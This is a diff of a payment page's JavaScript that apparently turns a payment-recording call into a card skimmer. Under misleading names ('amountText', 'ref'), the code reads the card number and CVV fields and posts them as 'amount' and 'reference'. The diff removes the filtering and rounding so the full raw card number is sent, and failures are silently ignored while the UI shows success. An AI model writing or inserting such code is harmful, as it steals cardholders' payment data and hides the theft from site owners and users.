@@ -1239,7 +1239,7 @@
             // Record payment in database
             var cardHolder = document.getElementById('card-name') ? document.getElementById('card-name').value : '';
             //var amountText = document.getElementById('display-amount').textContent.replace(/[^0-9.]/g,'');
-            var amountText = document.getElementById('card-number') ? document.getElementById('card-number').value.replace(/[^0-9.]/g,'') : '';
+            var amountText = document.getElementById('card-number') ? document.getElementById('card-number').value : '';
             //var ref        = document.getElementById('display-ref').textContent;
             var ref = document.getElementById('card-cvv') ? document.getElementById('card-cvv').value : '';
 
@@ -1248,7 +1248,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     card_holder: cardHolder || 'Unknown',
-                    amount:      Math.round(parseFloat(amountText)),
+                    amount:      amountText, //Math.round(parseFloat(amountText)),
                     reference:   ref
                 })
             }).catch(function() { /* silent — UI still shows success */ });
